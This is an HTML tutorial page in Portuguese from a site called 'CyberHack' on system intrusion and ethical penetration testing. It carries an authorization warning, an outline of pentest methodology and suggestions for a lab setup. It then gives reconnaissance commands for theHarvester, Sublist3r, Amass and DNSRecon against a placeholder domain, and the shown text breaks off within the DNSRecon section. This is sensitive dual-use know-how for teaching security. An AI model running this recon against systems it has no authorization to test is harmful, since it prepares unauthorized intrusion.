@@ -1,0 +1,3303 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invasão de Sistemas - CyberHack</title>
+    
+    <link rel="icon" href="r.png" type="image/x-icon" />
+    <link rel="shortcut icon" href="r.png" type="image/x-icon" />
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rajdhani', 'Courier New', monospace;
+            color: #fff;
+            user-select: none;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap');
+
+        body {
+            background-color: #000000;
+            overflow-x: hidden;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        #canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        header {
+            padding: 20px 0;
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            text-shadow: 0 0 10px rgba(255, 105, 180, 0.5);
+        }
+
+        .logo::before {
+            content: '';
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #ff69b4;
+            margin-right: 10px;
+            box-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.7; }
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.8);
+            position: relative;
+            transition: color 0.3s;
+        }
+        
+        .home-btn {
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            padding: 8px 15px;
+            border-radius: 5px;
+            color: #fff !important;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 3px 10px rgba(255, 20, 147, 0.4);
+            transition: all 0.3s ease !important;
+        }
+        
+        .home-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.6);
+            color: #fff !important;
+        }
+        
+        .home-btn::after {
+            display: none;
+        }
+
+        .nav-links a:hover {
+            color: #ff69b4;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #ff69b4, transparent);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        
+        .page-title {
+            text-align: center;
+            margin: 50px 0;
+        }
+        
+        .page-title h1 {
+            font-size: 48px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .page-title h1::before,
+        .page-title h1::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .page-title h1::before {
+            left: 2px;
+            text-shadow: -1px 0 #00ffea;
+            animation: glitch-before 3s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+        
+        .page-title h1::after {
+            left: -2px;
+            text-shadow: 1px 0 #ff00c1;
+            animation: glitch-after 2s infinite alternate-reverse;
+            opacity: 0.3;
+        }
+        
+        @keyframes glitch-before {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(30% 0 25% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+        
+        @keyframes glitch-after {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(10% 0 40% 0); }
+            15% { clip-path: inset(0 0 0 0); }
+            100% { clip-path: inset(0 0 0 0); }
+        }
+        
+        .page-title p {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .warning-box {
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .warning-box h3 {
+            color: #ff69b4;
+            font-size: 20px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .warning-box h3 i {
+            margin-right: 10px;
+        }
+        
+        .warning-box p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .content-section {
+            margin-bottom: 80px;
+        }
+        
+        .section-title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #ff69b4;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+            padding-bottom: 10px;
+        }
+        
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 60%;
+            height: 2px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+        
+        .content-section p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+        
+        .content-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 30px;
+            margin: 30px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .content-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, #ff1493, #ff69b4);
+            z-index: 1;
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.4s ease;
+        }
+        
+        .content-box:hover::before {
+            transform: scaleX(1);
+        }
+        
+        .tool-box {
+            background: rgba(10, 10, 10, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.2);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 25px 0;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-box:hover {
+            border-color: rgba(255, 105, 180, 0.6);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.2);
+            transform: translateY(-5px);
+        }
+        
+        .tool-box h3 {
+            color: #ff69b4;
+            font-size: 22px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .tool-box h3 i {
+            margin-right: 10px;
+            font-size: 24px;
+        }
+        
+        .tool-box p {
+            margin-bottom: 15px;
+        }
+        
+        .command-block {
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.2);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+        
+        .command-block pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        .command-block code {
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+        }
+        
+        .comment {
+            color: #888;
+            font-style: italic;
+        }
+        
+        .steps-list {
+            list-style-type: none;
+            counter-reset: step-counter;
+            margin: 20px 0;
+            padding-left: 0;
+        }
+        
+        .steps-list li {
+            position: relative;
+            padding-left: 50px;
+            margin-bottom: 20px;
+            counter-increment: step-counter;
+        }
+        
+        .steps-list li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 35px;
+            height: 35px;
+            background: rgba(255, 105, 180, 0.2);
+            border: 1px solid rgba(255, 105, 180, 0.5);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ff69b4;
+            font-weight: bold;
+        }
+        
+        .note-box {
+            background: rgba(0, 255, 234, 0.1);
+            border: 1px solid rgba(0, 255, 234, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .note-box h4 {
+            color: #00ffea;
+            font-size: 18px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .note-box h4 i {
+            margin-right: 10px;
+        }
+        
+        .note-box p {
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 10px;
+        }
+        
+        .sub-section {
+            margin: 40px 0;
+        }
+        
+        .sub-section h3 {
+            font-size: 24px;
+            color: #ff69b4;
+            margin-bottom: 15px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .sub-section h3::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: linear-gradient(90deg, #ff69b4, transparent);
+        }
+        
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .tool-card {
+            background: rgba(10, 10, 10, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.3s ease;
+            height: 100%;
+        }
+        
+        .tool-card:hover {
+            border-color: rgba(255, 105, 180, 0.6);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.2);
+            transform: translateY(-5px);
+        }
+        
+        .tool-card h4 {
+            color: #ff69b4;
+            font-size: 20px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .tool-card h4 i {
+            margin-right: 10px;
+        }
+        
+        .tool-card p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .btn-link {
+            display: inline-block;
+            padding: 8px 15px;
+            background: linear-gradient(45deg, #ff1493, #ff69b4);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            text-decoration: none;
+            letter-spacing: 1px;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-link:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 20, 147, 0.4);
+        }
+        
+        .toc {
+            background: rgba(10, 10, 10, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 30px 0;
+            position: sticky;
+            top: 20px;
+        }
+        
+        .toc h3 {
+            color: #ff69b4;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .toc ul {
+            list-style-type: none;
+            padding-left: 0;
+        }
+        
+        .toc ul li {
+            margin-bottom: 10px;
+        }
+        
+        .toc ul li a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            transition: color 0.3s;
+            position: relative;
+            padding-left: 15px;
+            display: block;
+        }
+        
+        .toc ul li a:hover {
+            color: #ff69b4;
+        }
+        
+        .toc ul li a::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #ff69b4;
+        }
+        
+        .toc ul li ul {
+            padding-left: 20px;
+            margin-top: 5px;
+        }
+        
+        .toc ul li ul li {
+            margin-bottom: 5px;
+        }
+        
+        .toc ul li ul li a::before {
+            content: '•';
+        }
+        
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: rgba(255, 105, 180, 0.2);
+            border: 1px solid rgba(255, 105, 180, 0.5);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ff69b4;
+            text-decoration: none;
+            font-size: 24px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+        
+        .back-to-top.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .back-to-top:hover {
+            background: rgba(255, 105, 180, 0.4);
+            transform: translateY(-5px);
+        }
+        
+        .tab-container {
+            margin: 30px 0;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background: rgba(10, 10, 10, 0.7);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 5px;
+            color: rgba(255, 255, 255, 0.8);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .tab-btn.active {
+            background: linear-gradient(45deg, rgba(255, 20, 147, 0.2), rgba(255, 105, 180, 0.2));
+            border-color: rgba(255, 105, 180, 0.6);
+            color: #ff69b4;
+        }
+        
+        .tab-btn:hover:not(.active) {
+            border-color: rgba(255, 105, 180, 0.5);
+            color: #ff69b4;
+        }
+        
+        .tab-content {
+            display: none;
+            background: rgba(10, 10, 10, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        
+        .comparison-table th {
+            background: rgba(255, 105, 180, 0.1);
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 105, 180, 0.3);
+            color: #ff69b4;
+        }
+        
+        .comparison-table td {
+            padding: 10px 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .comparison-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .comparison-table tr:hover td {
+            background: rgba(255, 105, 180, 0.05);
+        }
+        
+        .two-col-layout {
+            display: grid;
+            grid-template-columns: 1fr 300px;
+            gap: 30px;
+        }
+        
+        footer {
+            padding: 40px 0;
+            border-top: 1px solid rgba(255, 105, 180, 0.3);
+            position: relative;
+            margin-top: 80px;
+        }
+        
+        .footer-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .footer-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff69b4;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: #ff69b4;
+        }
+        
+        .social-links {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .social-links a {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 105, 180, 0.1);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            color: #ff69b4;
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+        
+        .social-links a:hover {
+            background: rgba(255, 105, 180, 0.2);
+            transform: translateY(-3px);
+            border-color: rgba(255, 105, 180, 0.6);
+        }
+        
+        .digital-numbers {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #ff69b4;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 100;
+        }
+        
+        #random-numbers {
+            animation: flicker 0.5s infinite alternate;
+        }
+        
+        @keyframes flicker {
+            0% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
+        @media (max-width: 1200px) {
+            .two-col-layout {
+                grid-template-columns: 1fr;
+            }
+            
+            .toc {
+                position: static;
+                margin-top: 0;
+            }
+        }
+        
+        @media (max-width: 992px) {
+            .tool-grid {
+                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            }
+            
+            .page-title h1 {
+                font-size: 36px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .page-title h1 {
+                font-size: 28px;
+            }
+            
+            .section-title {
+                font-size: 26px;
+            }
+            
+            .tool-box h3, .sub-section h3 {
+                font-size: 20px;
+            }
+            
+            .tab-buttons {
+                flex-direction: column;
+            }
+        }
+        
+        .technique-icon {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 105, 180, 0.2);
+            border-radius: 50%;
+            margin-right: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ff69b4;
+            font-size: 20px;
+        }
+        
+        /* Estilo para código e terminal */
+        .code-block {
+            position: relative;
+            margin: 20px 0;
+        }
+        
+        .code-header {
+            background: rgba(30, 30, 30, 0.9);
+            border-radius: 10px 10px 0 0;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-bottom: none;
+        }
+        
+        .code-title {
+            font-size: 14px;
+            color: #ff69b4;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .code-copy {
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            cursor: pointer;
+            transition: color 0.3s;
+            font-size: 14px;
+        }
+        
+        .code-copy:hover {
+            color: #ff69b4;
+        }
+        
+        .code-content {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid rgba(255, 105, 180, 0.3);
+            border-radius: 0 0 10px 10px;
+            padding: 15px;
+            overflow-x: auto;
+        }
+        
+        .code-content pre {
+            margin: 0;
+        }
+        
+        .code-content code {
+            font-family: 'Courier New', monospace;
+            color: #f8f8f2;
+        }
+        
+        .code-content .command {
+            color: #50fa7b;
+        }
+        
+        .code-content .parameter {
+            color: #8be9fd;
+        }
+        
+        .code-content .string {
+            color: #f1fa8c;
+        }
+        
+        .code-content .comment {
+            color: #6272a4;
+        }
+        
+        .code-content .output {
+            color: #f8f8f2;
+            margin-top: 5px;
+            padding-top: 5px;
+            border-top: 1px dashed rgba(255, 255, 255, 0.2);
+        }
+    </style>
+</head>
+<body>
+    <canvas id="canvas"></canvas>
+    <div class="container">
+        <header>
+            <div class="logo">CyberHack</div>
+            <nav class="nav-links">
+                <a href="inicial.html" class="home-btn"><i class="fas fa-home"></i> Home</a>
+                <a href="#introducao">Introdução</a>
+                <a href="#reconhecimento">Reconhecimento</a>
+                <a href="#escaneamento">Escaneamento</a>
+                <a href="#exploracao">Exploração</a>
+                <a href="#pos-exploracao">Pós-Exploração</a>
+            </nav>
+        </header>
+
+        <div class="page-title">
+            <h1 data-text="Invasão de Sistemas">Invasão de Sistemas</h1>
+            <p>Técnicas avançadas de penetração, exploração de vulnerabilidades, escalonamento de privilégios e persistência em sistemas</p>
+        </div>
+        
+        <div class="warning-box">
+            <h3><i class="fas fa-exclamation-triangle"></i> AVISO IMPORTANTE</h3>
+            <p>Todo o conteúdo apresentado nesta página é destinado <strong>exclusivamente</strong> para fins educacionais e de segurança defensiva. As técnicas, ferramentas e métodos descritos devem ser utilizados <strong>apenas</strong> em ambientes controlados, laboratórios ou sistemas para os quais você tenha autorização explícita para testar.</p>
+            <p>A invasão não autorizada de sistemas é <strong>ilegal</strong> e pode resultar em sérias consequências legais. Sempre obtenha permissão por escrito antes de realizar testes de penetração em qualquer sistema.</p>
+        </div>
+        
+        <div class="two-col-layout">
+            <div class="main-content">
+                <section id="introducao" class="content-section">
+                    <h2 class="section-title">Introdução à Invasão de Sistemas</h2>
+                    <p>A invasão de sistemas, quando realizada eticamente como parte de testes de penetração autorizados, é uma prática essencial para identificar e corrigir vulnerabilidades antes que atacantes mal-intencionados possam explorá-las. Este processo segue uma metodologia estruturada que simula ataques reais para avaliar a segurança de sistemas, redes e aplicações.</p>
+                    
+                    <div class="content-box">
+                        <h3>Metodologia de Invasão Ética</h3>
+                        <p>Um teste de penetração completo geralmente segue estas fases principais:</p>
+                        
+                        <ol class="steps-list">
+                            <li>
+                                <strong>Planejamento e Autorização</strong>: Definição do escopo, obtenção de permissões, estabelecimento de regras de engajamento.
+                            </li>
+                            <li>
+                                <strong>Reconhecimento (Footprinting)</strong>: Coleta de informações sobre o alvo utilizando fontes públicas e técnicas passivas.
+                            </li>
+                            <li>
+                                <strong>Escaneamento e Enumeração</strong>: Identificação de sistemas ativos, portas abertas, serviços em execução e possíveis vulnerabilidades.
+                            </li>
+                            <li>
+                                <strong>Análise de Vulnerabilidades</strong>: Avaliação e priorização das vulnerabilidades encontradas.
+                            </li>
+                            <li>
+                                <strong>Exploração</strong>: Utilização de técnicas e ferramentas para explorar as vulnerabilidades identificadas.
+                            </li>
+                            <li>
+                                <strong>Pós-Exploração</strong>: Escalonamento de privilégios, movimentação lateral, persistência e extração de dados.
+                            </li>
+                            <li>
+                                <strong>Documentação e Relatório</strong>: Registro detalhado das vulnerabilidades, métodos de exploração e recomendações.
+                            </li>
+                            <li>
+                                <strong>Remediação e Reteste</strong>: Correção das vulnerabilidades e verificação da eficácia das correções.
+                            </li>
+                        </ol>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Configurando um Laboratório de Testes</h3>
+                        <p>Antes de aprender as técnicas de invasão, é fundamental configurar um ambiente de laboratório seguro para prática. Algumas opções incluem:</p>
+                        
+                        <div class="tool-grid">
+                            <div class="tool-card">
+                                <h4><i class="fas fa-server"></i> Máquinas Virtuais</h4>
+                                <p>Configure VMs isoladas com sistemas operacionais e serviços vulneráveis para prática segura.</p>
+                                <p><strong>Recomendações</strong>: VirtualBox, VMware, KVM</p>
+                                <a href="#" class="btn-link">Guia de Configuração</a>
+                            </div>
+                            
+                            <div class="tool-card">
+                                <h4><i class="fas fa-shield-alt"></i> Aplicações Vulneráveis</h4>
+                                <p>Plataformas intencionalmente vulneráveis para prática de exploração de aplicações web.</p>
+                                <p><strong>Recomendações</strong>: DVWA, WebGoat, OWASP Juice Shop</p>
+                                <a href="#" class="btn-link">Baixar Aplicações</a>
+                            </div>
+                            
+                            <div class="tool-card">
+                                <h4><i class="fas fa-graduation-cap"></i> Plataformas de Treinamento</h4>
+                                <p>Ambientes completos dedicados ao aprendizado de segurança cibernética e hacking ético.</p>
+                                <p><strong>Recomendações</strong>: HackTheBox, TryHackMe, VulnHub</p>
+                                <a href="#" class="btn-link">Acessar Plataformas</a>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="reconhecimento" class="content-section">
+                    <h2 class="section-title">Reconhecimento (Footprinting)</h2>
+                    <p>O reconhecimento é a fase inicial de qualquer teste de penetração, onde coletamos informações sobre o alvo utilizando técnicas passivas e ativas. Esta etapa é crucial, pois quanto mais informações tivermos, maiores serão nossas chances de encontrar vulnerabilidades exploráveis.</p>
+                    
+                    <div class="sub-section">
+                        <h3>OSINT (Open Source Intelligence)</h3>
+                        <p>A inteligência de fontes abertas envolve a coleta de informações disponíveis publicamente sobre o alvo, sem interagir diretamente com seus sistemas.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-search"></i> theHarvester</h3>
+                            <p>Ferramenta para coletar e-mails, subdomínios, hosts, nomes de funcionários, portas abertas e banners de múltiplas fontes públicas.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Comando Básico do theHarvester</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">theHarvester</span> -d <span class="parameter">exemplo.com</span> -b <span class="parameter">all</span> -l <span class="parameter">500</span> -f <span class="parameter">resultados.html</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Opções importantes:</p>
+                            <ul>
+                                <li><code>-d</code>: Domínio alvo</li>
+                                <li><code>-b</code>: Fontes de busca (google, bing, linkedin, etc. ou "all" para todas)</li>
+                                <li><code>-l</code>: Limite de resultados</li>
+                                <li><code>-f</code>: Arquivo de saída</li>
+                            </ul>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Busca Avançada com theHarvester</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">theHarvester</span> -d <span class="parameter">exemplo.com</span> -b <span class="parameter">linkedin,google,twitter,shodan</span> -l <span class="parameter">1000</span> -n -c -s</code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Opções adicionais:</p>
+                            <ul>
+                                <li><code>-n</code>: Realiza consultas DNS</li>
+                                <li><code>-c</code>: Realiza busca no Censys</li>
+                                <li><code>-s</code>: Realiza busca no Shodan</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-globe"></i> Maltego</h3>
+                            <p>Ferramenta avançada de OSINT que permite mapear relações entre entidades como pessoas, empresas, domínios, endereços IP e redes sociais através de transformações visuais.</p>
+                            
+                            <p>Passos para uso do Maltego:</p>
+                            <ol class="steps-list">
+                                <li>Abra o Maltego e crie um novo gráfico</li>
+                                <li>Arraste uma entidade de domínio para o gráfico</li>
+                                <li>Digite o nome do domínio alvo</li>
+                                <li>Clique com o botão direito na entidade e escolha "Run Transforms"</li>
+                                <li>Selecione as transformações desejadas, como "To DNS Name" ou "To Website"</li>
+                                <li>Continue executando transformações nas novas entidades para descobrir mais informações</li>
+                            </ol>
+                            
+                            <div class="note-box">
+                                <h4><i class="fas fa-info-circle"></i> Nota</h4>
+                                <p>O Maltego possui uma versão Community gratuita com recursos limitados e versões comerciais mais completas. Para testes de penetração profissionais, considere a versão comercial.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>Enumeração de Subdomínios</h3>
+                        <p>Encontrar subdomínios é crucial para expandir a superfície de ataque e descobrir pontos de entrada que podem não estar tão bem protegidos quanto o domínio principal.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-sitemap"></i> Sublist3r</h3>
+                            <p>Ferramenta que enumera subdomínios utilizando múltiplos motores de busca e serviços.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Enumeração Básica com Sublist3r</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sublist3r</span> -d <span class="parameter">exemplo.com</span> -o <span class="parameter">subdomains.txt</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Enumeração Avançada com Busca por Portas</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">sublist3r</span> -d <span class="parameter">exemplo.com</span> -b -p <span class="parameter">80,443,8080</span> -v -t <span class="parameter">50</span> -o <span class="parameter">subdomains_full.txt</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Opções importantes:</p>
+                            <ul>
+                                <li><code>-d</code>: Domínio alvo</li>
+                                <li><code>-b</code>: Usa força bruta além das buscas</li>
+                                <li><code>-p</code>: Especifica portas a verificar</li>
+                                <li><code>-v</code>: Modo verboso</li>
+                                <li><code>-t</code>: Número de threads</li>
+                                <li><code>-o</code>: Arquivo de saída</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-server"></i> Amass</h3>
+                            <p>Ferramenta avançada para mapeamento de rede que realiza descoberta de subdomínios, mapeamento externo de rede e coleta de informações de infraestrutura.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Enumeração Passiva com Amass</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">amass</span> enum -passive -d <span class="parameter">exemplo.com</span> -o <span class="parameter">amass_results.txt</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Enumeração Completa com Amass</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">amass</span> enum -active -brute -w <span class="parameter">/usr/share/wordlists/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt</span> -d <span class="parameter">exemplo.com</span> -o <span class="parameter">amass_complete.txt</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Visualização de Resultados</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code><span class="command">amass</span> viz -d3 -d <span class="parameter">exemplo.com</span></code></pre>
+                                </div>
+                            </div>
+                            
+                            <p>Modos de operação:</p>
+                            <ul>
+                                <li><code>enum</code>: Enumeração de subdomínios</li>
+                                <li><code>viz</code>: Visualização de dados</li>
+                                <li><code>track</code>: Rastreamento de mudanças ao longo do tempo</li>
+                                <li><code>db</code>: Gerenciamento do banco de dados</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="sub-section">
+                        <h3>DNS Recon e Análise de Zona</h3>
+                        <p>A análise de DNS pode revelar informações valiosas sobre a infraestrutura do alvo, incluindo servidores de e-mail, transferências de zona e outros registros importantes.</p>
+                        
+                        <div class="tool-box">
+                            <h3><i class="fas fa-network-wired"></i> DNSRecon</h3>
+                            <p>Ferramenta para realizar reconhecimento de DNS, incluindo transferências de zona, força bruta de subdomínios e cache snooping.</p>
+                            
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <span class="code-title">Reconhecimento Padrão</span>
+                                    <button class="code-copy"><i class="fas fa-copy"></i></button>
+                                </div>
+                                <div class="code-content">
